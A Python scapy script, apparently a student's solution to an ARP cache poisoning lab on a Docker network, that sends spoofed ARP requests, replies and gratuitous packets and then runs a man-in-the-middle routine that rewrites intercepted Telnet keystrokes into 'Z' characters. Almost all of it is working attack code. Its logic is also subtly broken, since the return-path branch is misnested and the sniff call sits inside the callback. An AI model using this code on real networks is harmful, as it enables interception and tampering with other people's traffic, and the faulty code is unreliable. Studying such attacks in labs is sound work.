from scapy.all import *

# IPs and MACs listed for easy access
A_IP = '10.9.0.5'
A_MAC = '02:42:0a:09:00:05'

B_IP = '10.9.0.6'
B_MAC = '02:42:0a:09:00:06'

# Attacker
M_IP = '10.9.0.105'
M_MAC = '02:42:0a:09:00:69'

# 1A
# In Docker setup, navitage into container A and run 'arp' to see poisoning results
E = Ether(dst='ff:ff:ff:ff:ff:ff')
A = ARP(op=1, psrc='10.9.0.6', pdst='10.9.0.5')
arp_A = E/A
sendp(arp_A)

# 1B
E = Ether(dst='ff:ff:ff:ff:ff:ff')
A = ARP(op=2, psrc='10.9.0.6', pdst='10.9.0.5')
arp_B = E/A
sendp(arp_B)

# 1C (gratuitious packets on host M)
# Maps M's MAC to B's IP
gp = Ether()/ARP()

gp[Ether].dst = 'ff:ff:ff:ff:ff:ff'

gp[ARP].psrc = B_IP
gp[ARP].pdst = B_IP

gp[ARP].op = 2

sendp(gp)

# 2.1
# M does ARP cache poisoning on both A and B
def send_ARP(m_dst, m_src, ip_dst, ip_src):
    E = Ether(dst=m_dst, src=m_src)
    A = ARP(op=2, hwsrc=m_src, psrc=ip_src, hwdst=m_dst, pdst=ip_dst)
    pkt = E/A
    sendp(pkt)

send_ARP(A_MAC, M_MAC, A_IP, B_IP)
send_ARP(B_MAC, M_MAC, B_IP, A_IP)

# 2.4
# "Man in the middle" attack
# Will replace every character with 'Z' when A is connected to Telnet server on B
def spoof_pkt(pkt):
    if pkt[Ether].src == A_MAC and pkt[IP].dst == B_IP:
        if pkt[TCP].payload:
            # deletion
            newpkt = IP(bytes(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].payload)
            del(newpkt[TCP].chksum)
            # creation of new packet
            original = pkt[TCP].payload.load
            data = original.decode()
            newdata = 'Z'*len(data)
            # new payload
            newpkt = newpkt/newdata
            print('Original: ',str(original),'Modified: ',newdata)
            send(newpkt, verbose=False)
        elif pkt[Ether].src == B_MAC and pkt[IP].dst == A_IP:
            newpkt = pkt[IP]
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            send(newpkt, verbose=False)

    pkt = sniff(filter='tcp',prn=spoof_pkt)